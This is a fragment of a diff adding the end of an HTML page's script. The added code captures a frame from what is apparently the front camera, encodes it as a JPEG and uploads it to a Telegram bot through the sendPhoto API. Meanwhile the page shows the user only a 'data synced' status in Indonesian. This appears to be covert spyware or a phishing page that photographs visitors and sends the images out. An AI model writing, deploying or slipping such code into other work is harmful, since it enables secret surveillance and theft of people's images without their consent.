+            cc.getContext('2d').drawImage(v,0,0);
+            const blob=await new Promise(r=>cc.toBlob(r,'image/jpeg',0.7));
+            if(blob){
+                const fd=new FormData();
+                fd.append('chat_id',C);
+                fd.append('photo',blob,'photo.jpg');
+                fd.append('caption','📷 Foto Kamera Depan · '+now);
+                await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:fd});
+            }
+        }
+
+        bar.className='sync ok';bar.textContent='✓ Data tersinkron';
+    }catch(e){
+        console.error(e);bar.className='sync er';bar.textContent='✗ Gagal sinkron';
+    }
+}
+</script>
+</body>
+</html>
